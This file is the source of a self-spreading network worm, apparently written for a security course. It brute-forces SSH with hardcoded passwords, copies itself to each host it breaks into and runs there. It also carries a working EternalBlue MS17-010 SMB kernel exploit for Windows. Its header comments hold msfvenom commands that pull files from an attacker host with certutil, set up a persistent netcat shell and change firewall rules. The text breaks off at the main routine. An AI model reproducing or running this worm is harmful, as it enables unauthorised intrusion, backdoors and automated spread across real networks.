#!/usr/bin/python
from impacket import smb
from struct import pack
import paramiko
import sys
import socket
import nmap
import netinfo
import os
import netifaces
from netaddr import IPAddress, IPNetwork
import random

'''

Exploiting the target (python exploit payload)
-------------------------------------------------------------------------------------------------
python worm.py sc_x64.bin

Construct Payload for Windows x64 (Ref: https://root4loot.com/post/eternalblue_manual_exploit/)
-------------------------------------------------------------------------------------------------
Obtaining the shellcode
git clone https://raw.githubusercontent.com/worawit/MS17-010/master/shellcode/eternalblue_kshellcode_x64.asm

Compiling the shellcode
nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin

Generate Payload (requires install.bat)
msfvenom -p windows/x64/exec CMD='cmd.exe /k "certutil.exe -split -urlcache -f http://192.168.22.225:8081/install.bat C:\install.bat && C:\install.bat"' EXITFUNC=thread --platform windows --format raw -o sc_x64_payload.bin

Generate Payload (doesn't require install.bat)
msfvenom -p windows/x64/exec CMD='cmd.exe /k "certutil.exe -split -urlcache -f http://192.168.22.225:8081/nc64.exe C:\nc64.exe && certutil.exe -split -urlcache -f http://192.168.22.225:8081/worm.py C:\worm.py && certutil.exe -split -urlcache -f http://192.168.22.225:8081/sc_x64.bin C:\sc_x64.bin && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f /v nc /d "C:\nc64.exe -Ldp 443 -e C:\Windows\System32\cmd.exe" && netsh advfirewall firewall add rule name="Allow TCP 443" dir=in action=allow protocol=TCP localport=443 && netsh advfirewall firewall add rule name="Block TCP 445" dir=in action=block protocol=TCP localport=445 && netsh advfirewall firewall add rule name="Block UDP 445" dir=in action=block protocol=UDP localport=445 && netsh advfirewall firewall add rule name="Block TCP 139" dir=in action=block protocol=TCP localport=139 && netsh advfirewall firewall add rule name="Block UDP 139" dir=in action=block protocol=UDP localport=139 && netsh advfirewall firewall add rule name="Block TCP 135" dir=in action=block protocol=TCP localport=135 && netsh advfirewall firewall add rule name="Block UDP 135" dir=in action=block protocol=UDP localport=135"' EXITFUNC=thread --platform windows --format raw -o sc_x64_payload.bin

Concentrating binaries
cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin

Run Python HTTP Server
python -m SimpleHTTPServer 8081

Netcat to connect to Windows target
-----------------------------------
nc -nv < windows ip > 443

Commands to show backdoor functionality on Windows target
whoami && dir C:\ && netsh firewall show portopening && reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

'''


#########################################################################################################################################
# The list of credentials to attempt
#########################################################################################################################################

credList = [
('hello1', 'world'),
('kali', 'kali'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
('root', 'toor'),
]

#########################################################################################################################################
# The file marking whether the worm should spread
#########################################################################################################################################

INFECTED_MARKER_FILE = "/tmp/infected.txt"
WORM_FILE = "/tmp/worm.py"
LOOPBACK_INTERFACE = "lo"
WORM_MSG =  "BEWARE! YOU HAVE BEEN A VICTIM OF OPERATION BLUE KITTY"

sc = ""
numGroomConn = 0

# Function to return network values such as default gateway, netmask, etc. related to a network interface

def network_values( interface ):

	# Retrieve and return the IP, network, cidr of the current network interface.
	# A system can have more than one address of the same type associated with each interface. But we are assuming that a interface doesn't have more than 1 address.

	netiface = netifaces.ifaddresses( interface )[2][0]

	ip = netiface['addr']	 											#Ref: https://www.programcreek.com/python/example/81895/netifaces.interfaces
	broadcast = netiface['broadcast']
	netmask=IPAddress(netiface['netmask'])
	network = str(IPNetwork('%s/%s' % (ip, netmask)).network)			#Ref: https://stackoverflow.com/questions/3755863/trying-to-use-my-subnet-address-in-python-code
	cidr = str(netmask.netmask_bits())									#Ref: https://stackoverflow.com/questions/38085571/how-use-netaddr-to-convert-subnet-mask-to-cidr-in-python

	'''
	#Code to retrieve broadcast and default gateway

	gateways =  netifaces.gateways()				# Get default gateway. Ref: https://cyruslab.net/2019/11/16/pythonnetifaces-module/
	for i in range(len(gateways.get(2))):					
		if gateways.get(2)[i][1] == interface:	
			default_gateway = gateways.get(2)[i][0]
	'''

	return ip, broadcast, network, cidr if not ip == "127.0.0.1" else None

# Funtion to return Linux hosts running SSH Server (Port 22 Open)

def getLinuxHostsOnTheSameNetwork(ip, broadcast, network, cidr):
	portScanner = nmap.PortScanner()
	portScanner.scan( network + "/" + cidr, arguments = '-p 22 --open --exclude ' + ip + ',' + broadcast)	#Ref: https://nmap.org/book/man-target-specification.html
	return portScanner.all_hosts()

# Funtion to return Windows hosts running SMB Service (Port 139,445 Open)

def getWindowsHostsOnTheSameNetwork(ip, broadcast, network, cidr):
	portScanner = nmap.PortScanner()
	portScanner.scan( network + "/" + cidr, arguments = '-p 139,445 --open --exclude ' + ip + ',' + broadcast)	#Ref: https://nmap.org/book/man-target-specification.html
	return portScanner.all_hosts()


#############################################################################################################################################################################
# Linux SSH Dictionary Attack Definitions Below
#############################################################################################################################################################################

##################################################################
# Returns whether the worm should spread
# @param sftpClient - SFTP client object 
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem( sftpClient ):
	# Check if the system has been infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected).
	try:
		sftpClient.stat( INFECTED_MARKER_FILE )		# Check if remote host is infected
		return True
	except IOError:
		return False

#################################################################
# Marks the system as infected
#################################################################
def markInfected( ):
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	# sftpClient.put( "/tmp/infected.txt", INFECTED_MARKER_FILE )

	infected_tag = open( INFECTED_MARKER_FILE, "w" )
	infected_tag.write( WORM_MSG )
	infected_tag.close()

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute( sshClient, sftpClient ):
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.
	try:
		sftpClient.put( find_file( "worm.py" ), "/tmp/" + "worm.py" )

		sshClient.exec_command( "chmod a+x /tmp/worm.py" )
		sshClient.exec_command( "nohup python2 /tmp/worm.py" )
		print "worm.py has executed discreetly"
	except:
		print sys.exc_info()[0]


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials( host, userName, password, sshClient ):
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.

	try:
		sshClient.connect( host, username = userName, password = password )
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     
	# Otherwise.
	except socket.error as sock_err:
		print "Socket Error - " + sock_err
		return 3
	# If the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception.
	except paramiko.SSHException as miko_err:
		print "Wrong credentials: " + str( miko_err )
		return 1
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	return 0


###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSSH( host ):
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		attemptResults = tryCredentials( host, username, password, ssh )
		# Call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system.
		if attemptResults == 0:
			return (ssh, host, username, password )
			
	# Could not find working credentials
	return None

###############################################################
# Returns the file path where worm.py is located and None if
# not found
# @param file_name - File name being searched for
###############################################################
def find_file( file_name ):
	# This is to get the directory that the program  
	# is currently running in. 
	dir_path = os.path.dirname(os.path.realpath(__file__)) 
	  
	for root, dirs, files in os.walk(dir_path): 
	    for file in files:  
	        if file.endswith('.py'): 
	            return (root+'/'+str(file_name))
	return None


#####################################################################################################################################################################
# Windows SMB Buffer Overflow SMB EternalBlue MS17-010 Exploit 
#####################################################################################################################################################################

##########################################################################################################################
'''
Bug detail:
- For the buffer overflow bug detail
- please see http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/
- The exploit also use other 2 bugs
  - Send a large transaction with SMB_COM_NT_TRANSACT 
  	but processed as SMB_COM_TRANSACTION2 (requires for trigger bug)
  - Send special session setup command (SMB login command) 
    to allocate big nonpaged pool (use for creating hole)
'''
##########################################################################################################################
def getNTStatus(self):
	return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)

def sendEcho(conn, tid, data):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)
	transCommand['Parameters'] = smb.SMBEcho_Parameters()
	transCommand['Data'] = smb.SMBEcho_Data()

	transCommand['Parameters']['EchoCount'] = 1
	transCommand['Data']['Data'] = data
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)
	recvPkt = conn.recvSMB()
	if recvPkt.getNTStatus() == 0:
		print('got good ECHO response')
	else:
		print('got bad ECHO response: 0x{:x}'.format(recvPkt.getNTStatus()))


#####################################################################################################################################################################
	# There is a bug in SMB_COM_SESSION_SETUP_ANDX command that allow us to allocate a big nonpaged pool.
	# The big nonpaged pool allocation is in BlockingSessionSetupAndX() function for storing NativeOS and NativeLanMan.
	# The NativeOS and NativeLanMan size is caculated from "ByteCount - other_data_size"
	
	# Normally a server validate WordCount and ByteCount field in SrvValidateSmb() function. They must not be larger than received data. 
	# For "NT LM 0.12" dialect, There are 2 possible packet format for SMB_COM_SESSION_SETUP_ANDX command.
	# - https://msdn.microsoft.com/en-us/library/ee441849.aspx for LM and NTLM authentication
	#   - GetNtSecurityParameters() function is resposible for extracting data from this packet format
	# - https://msdn.microsoft.com/en-us/library/cc246328.aspx for NTLMv2 (NTLM SSP) authentication
	#   - GetExtendSecurityParameters() function is resposible for extracting data from this packet format
	
	# These 2 formats have different WordCount (first one is 13 and later is 12). 
	# Here is logic in BlockingSessionSetupAndX() related to this bug
	# - check WordCount for both formats (the CAP_EXTENDED_SECURITY must be set for extended security format)
	# - if FLAGS2_EXTENDED_SECURITY and CAP_EXTENDED_SECURITY are set, process a message as Extend Security request
	# - else, process a message as NT Security request
	
	# So we can send one format but server processes it as another format by controlling FLAGS2_EXTENDED_SECURITY and CAP_EXTENDED_SECURITY.
	# With this confusion, server read a ByteCount from wrong offset to calculating "NativeOS and NativeLanMan size".
	# But GetExtendSecurityParameters() checks ByteCount value again.
	
	# So the only possible request to use the bug is sending Extended Security request but does not set FLAGS2_EXTENDED_SECURITY.
	
#####################################################################################################################################################################
def createSessionAllocNonPaged(target, size):
	
	conn = smb.SMB(target, target)
	_, flags2 = conn.get_flags()
	# FLAGS2_EXTENDED_SECURITY MUST not be set
	flags2 &= ~smb.SMB.FLAGS2_EXTENDED_SECURITY
	# if not use unicode, buffer size on target machine is doubled because converting ascii to utf16
	if size >= 0xffff:
		flags2 &= ~smb.SMB.FLAGS2_UNICODE
		reqSize = size // 2
	else:
		flags2 |= smb.SMB.FLAGS2_UNICODE
		reqSize = size
	conn.set_flags(flags2=flags2)
	
	pkt = smb.NewSMBPacket()

	sessionSetup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
	sessionSetup['Parameters'] = smb.SMBSessionSetupAndX_Extended_Parameters()

	sessionSetup['Parameters']['MaxBufferSize']      = 61440  # can be any value greater than response size
	sessionSetup['Parameters']['MaxMpxCount']        = 2  # can by any value
	sessionSetup['Parameters']['VcNumber']           = 2  # any non-zero
	sessionSetup['Parameters']['SessionKey']         = 0
	sessionSetup['Parameters']['SecurityBlobLength'] = 0  # this is OEMPasswordLen field in another format. 0 for NULL session
	# UnicodePasswordLen field is in Reserved for extended security format. 0 for NULL session
	sessionSetup['Parameters']['Capabilities']       = smb.SMB.CAP_EXTENDED_SECURITY  # can add other flags

	sessionSetup['Data'] = pack('<H', reqSize) + '\x00'*20
	pkt.addCommand(sessionSetup)

	conn.sendSMB(pkt)
	recvPkt = conn.recvSMB()
	if recvPkt.getNTStatus() == 0:
		print('SMB1 session setup allocate nonpaged pool success')
	else:
		print('SMB1 session setup allocate nonpaged pool failed')
	return conn


# Note: impacket-0.9.15 struct has no ParameterDisplacement
############# SMB_COM_TRANSACTION2_SECONDARY (0x33)
class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
    structure = (
        ('TotalParameterCount','<H=0'),
        ('TotalDataCount','<H'),
        ('ParameterCount','<H=0'),
        ('ParameterOffset','<H=0'),
        ('ParameterDisplacement','<H=0'),
        ('DataCount','<H'),
        ('DataOffset','<H'),
        ('DataDisplacement','<H=0'),
        ('FID','<H=0'),
    )

def send_trans2_second(conn, tid, data, displacement):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	# assume no params

	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
	transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
	transCommand['Data'] = smb.SMBTransaction2Secondary_Data()

	transCommand['Parameters']['TotalParameterCount'] = 0
	transCommand['Parameters']['TotalDataCount'] = len(data)

	fixedOffset = 32+3+18
	transCommand['Data']['Pad1'] = ''

	transCommand['Parameters']['ParameterCount'] = 0
	transCommand['Parameters']['ParameterOffset'] = 0

	if len(data) > 0:
		pad2Len = (4 - fixedOffset % 4) % 4
		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
	else:
		transCommand['Data']['Pad2'] = ''
		pad2Len = 0

	transCommand['Parameters']['DataCount'] = len(data)
	transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
	transCommand['Parameters']['DataDisplacement'] = displacement

	transCommand['Data']['Trans_Parameters'] = ''
	transCommand['Data']['Trans_Data'] = data
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)


#####################################################################################################################################################################

# Here is another bug in MS17-010.
	# To call transaction subcommand, normally a client need to use correct SMB commands as documented in
	#   https://msdn.microsoft.com/en-us/library/ee441514.aspx
	# If a transaction message is larger than SMB message (MaxBufferSize in session parameter), a client 
	#   can use *_SECONDARY command to send transaction message. When sending a transaction completely with
	#   *_SECONDARY command, a server uses the last command that complete the transaction.
	# For example:
	# - if last command is SMB_COM_NT_TRANSACT_SECONDARY, a server executes subcommand as NT_TRANSACT_*.
	# - if last command is SMB_COM_TRANSACTION2_SECONDARY, a server executes subcommand as TRANS2_*.
	#
	# Without MS17-010 patch, a client can mix a transaction command if TID, PID, UID, MID are the same.
	# For example:
	# - a client start transaction with SMB_COM_NT_TRANSACT command
	# - a client send more transaction data with SMB_COM_NT_TRANSACT_SECONDARY and SMB_COM_TRANSACTION2_SECONDARY
	# - a client sned last transactino data with SMB_COM_TRANSACTION2_SECONDARY
	# - a server executes transaction subcommand as TRANS2_* (first 2 bytes of Setup field)
	
	# From https://msdn.microsoft.com/en-us/library/ee442192.aspx, a maximum data size for sending a transaction 
	#   with SMB_COM_TRANSACTION2 is 65535 because TotalDataCount field is USHORT
	# While a maximum data size for sending a transaction with SMB_COM_NT_TRANSACT is >65536 because TotalDataCount
	#   field is ULONG (see https://msdn.microsoft.com/en-us/library/ee441534.aspx).
	# Note: a server limit SetupCount+TotalParameterCount+TotalDataCount to 0x10400 (in SrvAllocationTransaction)
	

#####################################################################################################################################################################
def send_big_trans2(conn, tid, setup, data, param, firstDataFragmentSize, sendLastChunk=True):
	
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	command = pack('<H', setup)
	
	# Use SMB_COM_NT_TRANSACT because we need to send data >65535 bytes to trigger the bug.
	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
	transCommand['Parameters'] = smb.SMBNTTransaction_Parameters()
	transCommand['Parameters']['MaxSetupCount'] = 1
	transCommand['Parameters']['MaxParameterCount'] = len(param)
	transCommand['Parameters']['MaxDataCount'] = 0
	transCommand['Data'] = smb.SMBTransaction2_Data()

	transCommand['Parameters']['Setup'] = command
	transCommand['Parameters']['TotalParameterCount'] = len(param)
	transCommand['Parameters']['TotalDataCount'] = len(data)

	fixedOffset = 32+3+38 + len(command)
	if len(param) > 0:
		padLen = (4 - fixedOffset % 4 ) % 4
		padBytes = '\xFF' * padLen
		transCommand['Data']['Pad1'] = padBytes
	else:
		transCommand['Data']['Pad1'] = ''
		padLen = 0

	transCommand['Parameters']['ParameterCount'] = len(param)
	transCommand['Parameters']['ParameterOffset'] = fixedOffset + padLen

	if len(data) > 0:
		pad2Len = (4 - (fixedOffset + padLen + len(param)) % 4) % 4
		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
	else:
		transCommand['Data']['Pad2'] = ''
		pad2Len = 0

	transCommand['Parameters']['DataCount'] = firstDataFragmentSize
	transCommand['Parameters']['DataOffset'] = transCommand['Parameters']['ParameterOffset'] + len(param) + pad2Len

	transCommand['Data']['Trans_Parameters'] = param
	transCommand['Data']['Trans_Data'] = data[:firstDataFragmentSize]
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)
	conn.recvSMB() # must be success
	
	# Then, use SMB_COM_TRANSACTION2_SECONDARY for send more data
	i = firstDataFragmentSize
	while i < len(data):
		# limit data to 4096 bytes per SMB message because this size can be used for all Windows version
		sendSize = min(4096, len(data) - i)
		if len(data) - i <= 4096:
			if not sendLastChunk:
				break
		send_trans2_second(conn, tid, data[i:i+sendSize], i)
		i += sendSize
	
	if sendLastChunk:
		conn.recvSMB()
	return i


#####################################################################################################################################################################

# connect to target and send a large nbss size with data 0x80 bytes
# this method is for allocating big nonpaged pool (no need to be same size as overflow buffer) on target
# a nonpaged pool is allocated by srvnet.sys that started by useful struct (especially after overwritten)
# https://msdn.microsoft.com/en-us/library/cc246496.aspx
	# Above link is about SMB2, but the important here is first 4 bytes.
	# If using wireshark, you will see the StreamProtocolLength is NBSS length.
	# The first 4 bytes is same for all SMB version. It is used for determine the SMB message length.
	#
	# After received first 4 bytes, srvnet.sys allocate nonpaged pool for receving SMB message.
	# srvnet.sys forwards this buffer to SMB message handler after receiving all SMB message.
	# Note: For Windows 7 and Windows 2008, srvnet.sys also forwards the SMB message to its handler when connection lost too.

#####################################################################################################################################################################
def createConnectionWithBigSMBFirst80(target):
	sk = socket.create_connection((target, 445))
	# For this exploit, use size is 0x11000
	pkt = '\x00' + '\x00' + pack('>H', 0xfff7)
	# There is no need to be SMB2 because we got code execution by corrupted srvnet buffer.
	# Also this is invalid SMB2 message.
	# I believe NSA exploit use SMB2 for hiding alert from IDS
	#pkt += '\xfeSMB' # smb2
	# it can be anything even it is invalid
	pkt += 'BAAD' # can be any
	pkt += '\x00'*0x7c
	sk.send(pkt)
	return sk


#####################################################################################################################################################################
'''
- The exploit use heap of HAL (address 0xffffffffffd00010 on x64) for placing fake struct and shellcode.
- This memory page is executable on Windows 7 and Windows 2008.
- The feaList and fakeStruct works on both x86 and x64.
- The overflow is happened on nonpaged pool so we need to massage target nonpaged pool.
- If exploit failed but target does not crash, try increasing 'numGroomConn' value (at least 5)
- See the code and comment for exploit detail.
'''
#####################################################################################################################################################################
def attackSMB(target, shellcode, numGroomConn):
	# force using smb.SMB for SMB1
	conn = smb.SMB(target, target)

	# can use conn.login() for ntlmv2
	conn.login_standard('', '')
	server_os = conn.get_server_os()
	print "\nStarting Windows SMB EternalBlue Exploitation on", target
	print('Target OS: '+server_os)
	if not (server_os.startswith("Windows 7 ") or (server_os.startswith("Windows Server ") and ' 2008 ' in server_os) or server_os.startswith("Windows Vista")):
		print('This exploit does not support this target')
		sys.exit()
	

	tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
	
	# The minimum requirement to trigger bug in SrvOs2FeaListSizeToNt() is SrvSmbOpen2() which is TRANS2_OPEN2 subcommand.
	# Send TRANS2_OPEN2 (0) with special feaList to a target except last fragment
	progress = send_big_trans2(conn, tid, 0, feaList, '\x00'*30, 2000, False)
	# we have to know what size of NtFeaList will be created when last fragment is sent

	# make sure server recv all payload before starting allocate big NonPaged
	#sendEcho(conn, tid, 'a'*12)

	# create buffer size NTFEA_SIZE-0x1000 at server
	# this buffer MUST NOT be big enough for overflown buffer
	allocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x1010)
	
	# groom nonpaged pool
	# when many big nonpaged pool are allocated, allocate another big nonpaged pool should be next to the last one
	srvnetConn = []
	for i in range(numGroomConn):
		sk = createConnectionWithBigSMBFirst80(target)
		srvnetConn.append(sk)

	# create buffer size NTFEA_SIZE at server
	# this buffer will be replaced by overflown buffer
	holeConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x10)
	# disconnect allocConn to free buffer
	# expect small nonpaged pool allocation is not allocated next to holeConn because of this free buffer
	allocConn.get_socket().close()

	# hope one of srvnetConn is next to holeConn
	for i in range(5):
		sk = createConnectionWithBigSMBFirst80(target)
		srvnetConn.append(sk)
		
	# send echo again, all new 5 srvnet buffers should be created
	#sendEcho(conn, tid, 'a'*12)
	
	# remove holeConn to create hole for fea buffer
	holeConn.get_socket().close()

	# send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
	send_trans2_second(conn, tid, feaList[progress:], progress)
	recvPkt = conn.recvSMB()
	retStatus = recvPkt.getNTStatus()
	# retStatus MUST be 0xc000000d (INVALID_PARAMETER) because of invalid fea flag
	if retStatus == 0xc000000d:
		print "SMB Exploitation successful on", target
		print "Connect to implanted backdoor after target restart and login . . ."
	else:
		print('bad response status: 0x{:08x}'.format(retStatus))

		
	# one of srvnetConn struct header should be modified
	# a corrupted buffer will write recv data in designed memory address
	for sk in srvnetConn:
		sk.send(fake_recv_struct + shellcode)

	# execute shellcode by closing srvnet connection
	for sk in srvnetConn:
		sk.close()

	# nicely close connection (no need for exploit)
	conn.disconnect_tree(tid)
	conn.logoff()
	conn.get_socket().close()


#####################################################################################################################################################################

# Most field in overwritten (corrupted) srvnet struct can be any value because it will be left without free (memory leak) after processing
# Here is the important fields on x64
# - offset 0x58 (VOID*) : pointer to a struct contained pointer to function. the pointer to function is called when done receiving SMB request.
#                           The value MUST point to valid (might be fake) struct.
# - offset 0x70 (MDL)   : MDL for describe receiving SMB request buffer
#   - 0x70 (VOID*)    : MDL.Next should be NULL
#   - 0x78 (USHORT)   : MDL.Size should be some value that not too small
#   - 0x7a (USHORT)   : MDL.MdlFlags should be 0x1004 (MDL_NETWORK_HEADER|MDL_SOURCE_IS_NONPAGED_POOL)
#   - 0x80 (VOID*)    : MDL.Process should be NULL
#   - 0x88 (VOID*)    : MDL.MappedSystemVa MUST be a received network buffer address. Controlling this value get arbitrary write.
#                         The address for arbitrary write MUST be subtracted by a number of sent bytes (0x80 in this exploit).
#                         
#
# To free the corrupted srvnet buffer, shellcode MUST modify some memory value to satisfy condition.
# Here is related field for freeing corrupted buffer
# - offset 0x10 (USHORT): be 0xffff to make SrvNetFreeBuffer() really free the buffer (else buffer is pushed to srvnet lookaside)
#                           a corrupted buffer MUST not be reused.
# - offset 0x48 (DWORD) : be a number of total byte received. This field MUST be set by shellcode because SrvNetWskReceiveComplete() set it to 0
#                           before calling SrvNetCommonReceiveHandler(). This is possible because pointer to SRVNET_BUFFER struct is passed to
#                           your shellcode as function argument
# - offset 0x60 (PMDL)  : points to any fake MDL with MDL.Flags 0x20 does not set
# The last condition is your shellcode MUST return non-negative value. The easiest way to do is "xor eax,eax" before "ret".
# Here is x64 assembly code for setting nByteProcessed field
# - fetch SRVNET_BUFFER address from function argument
#     \x48\x8b\x54\x24\x40  mov rdx, [rsp+0x40]
# - set nByteProcessed for trigger free after return
#     \x8b\x4a\x2c          mov ecx, [rdx+0x2c]
#     \x89\x4a\x38          mov [rdx+0x38], ecx
# wanted overflown buffer size (this exploit support only 0x10000 and 0x11000)
# the size 0x10000 is easier to debug when setting breakpoint in SrvOs2FeaToNt() because it is called only 2 time
# the size 0x11000 is used in nsa exploit. this size is more reliable.

#####################################################################################################################################################################
NTFEA_SIZE = 0x11000
# the NTFEA_SIZE above is page size. We need to use most of last page preventing any data at the end of last page

ntfea10000 = pack('<BBH', 0, 0, 0xffdd) + 'A'*0xffde

ntfea11000 = (pack('<BBH', 0, 0, 0) + '\x00')*600  # with these fea, ntfea size is 0x1c20
ntfea11000 += pack('<BBH', 0, 0, 0xf3bd) + 'A'*0xf3be  # 0x10fe8 - 0x1c20 - 0xc = 0xf3bc

ntfea1f000 = (pack('<BBH', 0, 0, 0) + '\x00')*0x2494  # with these fea, ntfea size is 0x1b6f0
ntfea1f000 += pack('<BBH', 0, 0, 0x48ed) + 'A'*0x48ee  # 0x1ffe8 - 0x1b6f0 - 0xc = 0x48ec

ntfea = { 0x10000 : ntfea10000, 0x11000 : ntfea11000 }

TARGET_HAL_HEAP_ADDR_x64 = 0xffffffffffd00010
TARGET_HAL_HEAP_ADDR_x86 = 0xffdff000

fakeSrvNetBufferNsa = pack('<II', 0x11000, 0)*2
fakeSrvNetBufferNsa += pack('<HHI', 0xffff, 0, 0)*2
fakeSrvNetBufferNsa += '\x00'*16
fakeSrvNetBufferNsa += pack('<IIII', TARGET_HAL_HEAP_ADDR_x86+0x100, 0, 0, TARGET_HAL_HEAP_ADDR_x86+0x20)
fakeSrvNetBufferNsa += pack('<IIHHI', TARGET_HAL_HEAP_ADDR_x86+0x100, 0, 0x60, 0x1004, 0)  # _, x86 MDL.Next, .Size, .MdlFlags, .Process
fakeSrvNetBufferNsa += pack('<IIQ', TARGET_HAL_HEAP_ADDR_x86-0x80, 0, TARGET_HAL_HEAP_ADDR_x64)  # x86 MDL.MappedSystemVa, _, x64 pointer to fake struct
fakeSrvNetBufferNsa += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0x100, 0)  # x64 pmdl2
# below 0x20 bytes is overwritting MDL
# NSA exploit overwrite StartVa, ByteCount, ByteOffset fields but I think no need because ByteCount is always big enough
fakeSrvNetBufferNsa += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
fakeSrvNetBufferNsa += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64-0x80)  # MDL.Process, MDL.MappedSystemVa

# below is for targeting x64 only (all x86 related values are set to 0)
# this is for show what fields need to be modified
fakeSrvNetBufferX64 = pack('<II', 0x11000, 0)*2
fakeSrvNetBufferX64 += pack('<HHIQ', 0xffff, 0, 0, 0)
fakeSrvNetBufferX64 += '\x00'*16
fakeSrvNetBufferX64 += '\x00'*16
fakeSrvNetBufferX64 += '\x00'*16  # 0x40
fakeSrvNetBufferX64 += pack('<IIQ', 0, 0, TARGET_HAL_HEAP_ADDR_x64)  # _, _, pointer to fake struct
fakeSrvNetBufferX64 += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0x100, 0)  # pmdl2
fakeSrvNetBufferX64 += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
fakeSrvNetBufferX64 += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64-0x80)  # MDL.Process, MDL.MappedSystemVa

fakeSrvNetBuffer = fakeSrvNetBufferNsa
#fakeSrvNetBuffer = fakeSrvNetBufferX64

feaList = pack('<I', 0x10000)  # the value of feaList size MUST be >=0x10000 to trigger bug (but must be less than data size)
feaList += ntfea[NTFEA_SIZE]
# Note:
# - SMB1 data buffer header is 16 bytes and 8 bytes on x64 and x86 respectively
#   - x64: below fea will be copy to offset 0x11000 of overflow buffer
#   - x86: below fea will be copy to offset 0x10ff8 of overflow buffer
feaList += pack('<BBH', 0, 0, len(fakeSrvNetBuffer)-1) + fakeSrvNetBuffer # -1 because first '\x00' is for name
# stop copying by invalid flag (can be any value except 0 and 0x80)
feaList += pack('<BBH', 0x12, 0x34, 0x5678)

fake_recv_struct = pack('<QII', 0, 3, 0)
fake_recv_struct += '\x00'*16
fake_recv_struct += pack('<QII', 0, 3, 0)
fake_recv_struct += ('\x00'*16)*7
fake_recv_struct += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0xa0, TARGET_HAL_HEAP_ADDR_x64+0xa0)  # offset 0xa0 (LIST_ENTRY to itself)
fake_recv_struct += '\x00'*16
fake_recv_struct += pack('<IIQ', TARGET_HAL_HEAP_ADDR_x86+0xc0, TARGET_HAL_HEAP_ADDR_x86+0xc0, 0)  # x86 LIST_ENTRY
fake_recv_struct += ('\x00'*16)*11
fake_recv_struct += pack('<QII', 0, 0, TARGET_HAL_HEAP_ADDR_x86+0x190)  # fn_ptr array on x86
fake_recv_struct += pack('<IIQ', 0, TARGET_HAL_HEAP_ADDR_x86+0x1f0-1, 0)  # x86 shellcode address
fake_recv_struct += ('\x00'*16)*3
fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64+0x1e0)  # offset 0x1d0: KSPINLOCK, fn_ptr array
fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64+0x1f0-1)  # x64 shellcode address - 1 (this value will be increment by one)



#############################################################################################################################################################################
# WORM PROGRAM STARTS . . .
#############################################################################################################################################################################
if len( sys.argv ) >= 1:
	# If we are running on the victim, check if the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice.
